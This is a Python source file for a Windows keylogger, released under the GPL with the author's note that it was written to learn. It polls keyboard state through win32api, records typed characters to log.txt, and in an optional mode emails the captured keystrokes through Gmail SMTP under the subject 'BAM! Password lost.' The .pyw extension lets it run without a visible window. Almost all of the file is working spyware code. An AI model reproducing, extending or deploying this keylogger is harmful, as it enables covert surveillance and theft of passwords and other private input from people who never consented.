#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#  win32_keylogger.pyw
#  
#  Copyright 2015 Ericson Willians (Rederick Deathwill) <EricsonWRP@ERICSONWRP-PC>
#  
#  This program is free software; you can redistribute it and/or modify
#  it under the terms of the GNU General Public License as published by
#  the Free Software Foundation; either version 2 of the License, or
#  (at your option) any later version.
#  
#  This program is distributed in the hope that it will be useful,
#  but WITHOUT ANY WARRANTY; without even the implied warranty of
#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#  GNU General Public License for more details.
#  
#  You should have received a copy of the GNU General Public License
#  along with this program; if not, write to the Free Software
#  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
#  MA 02110-1301, USA.
#  
#  ===============================================================================
#
#  I wrote this script in order to learn how to make a keylogger (For curiosity).
#  I'm making it available so that you can learn from it.
#  I did not make it too advanced (Monitoring shifts, alts, arrows, numlock, delete and so on),
#  Because it is not my intention to really use it (And cause harm).
#  Remember: Hack to learn, don't learn to hack!
#
#

import win32api
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

DEFAULT_PATH = 'log.txt'
SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587
EMAIL = 'include_your_gmail_here@gmail.com'
PASSWORD = 'include_your_gmail_password_here'
PATH_MODE = 1
EMAIL_MODE = 0
NUMBER_OF_KEYS = 256

VK = {
		20: 'caps_lock',
		27: 'esc',
		32: 'spacebar',
		48: '0',
		49: '1',
		50: '2',
		51: '3',
		52: '4',
		53: '5',
		54: '6',
		55: '7',
		56: '8',
		57: '9',
		65: 'a',
		66: 'b',
		67: 'c',
		68: 'd',
		69: 'e',
		70: 'f',
		71: 'g',
		72: 'h',
		73: 'i',
		74: 'j',
		75: 'k',
		76: 'l',
		77: 'm',
		78: 'n',
		79: 'o',
		80: 'p',
		81: 'q',
		82: 'r',
		83: 's',
		84: 't',
		85: 'u',
		86: 'v',
		87: 'w',
		88: 'x',
		89: 'y',
		90: 'z',
		96: 'numpad_0',
		97: 'numpad_1',
		98: 'numpad_2',
		99: 'numpad_3',
		100: 'numpad_4',
		101: 'numpad_5',
		102: 'numpad_6',
		103: 'numpad_7',
		104: 'numpad_8',
		105: 'numpad_9',
		186: ';',
		187: '+',
		188: ',',
		189: '-',
		190: '.',
		191: '/',
		192: '`',
		219: '[',
		220: '\\',
		221: ']',
		222: "'",}

def get_key_state(vk_code):
	state = int(win32api.GetKeyState(vk_code))
	if state == 1:
		return 1 # Key is on.
	elif state == 0:
		return 0 # Key is off.
	else:
		return -1 
		
def press_key(vk_code):
    state = int(win32api.GetKeyState(vk_code))
    if state == -127 or state == -128:
        return 1 # Key was pressed.
    else:
        return 0 # Key was released.

if __name__ == "__main__":
	
	log_mode = PATH_MODE # Change to EMAIL_MODE in order to send an email to yourself.
	msg = MIMEMultipart('alternative')
	msg['Subject'] = "BAM! Password lost."
	msg['From'] = EMAIL
	msg['To'] = EMAIL
	
	key_states = [False for n in range(NUMBER_OF_KEYS)]
	key = 0
	chars = []
	upper = False
	
	def _write(c):
		if log_mode == PATH_MODE:
			with open(DEFAULT_PATH, 'a') as _file:
				_file.write(c)
		elif log_mode == EMAIL_MODE:
			chars.append(c)
	
	def _send():
		msg.attach(MIMEText(''.join(chars)))
		mail = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
	#	mail.set_debuglevel(1)
		mail.ehlo()
		mail.starttls()
		mail.login(EMAIL, PASSWORD)
		mail.sendmail(EMAIL, EMAIL, msg.as_string())
		mail.quit()
	
	while key < NUMBER_OF_KEYS:
		if get_key_state(20):
			upper = True
		else:
			upper = False
		if key == NUMBER_OF_KEYS-1: 
			key = 0
		else:
			try:
				if press_key(key):
					if not key_states[key]:
						key_states[key] = True
						if VK[key] == 'esc':
							if log_mode == EMAIL_MODE:
								_send()
							exit()
						elif VK[key] == 'spacebar':
							char = ' '
						elif VK[key] == 'caps_lock':
							char = ''
						else:
							if upper:
								char = VK[key].upper()
							else:
								char = VK[key]
						_write(char)
				else:
					key_states[key] = False
			except KeyError:
				pass
		key += 1
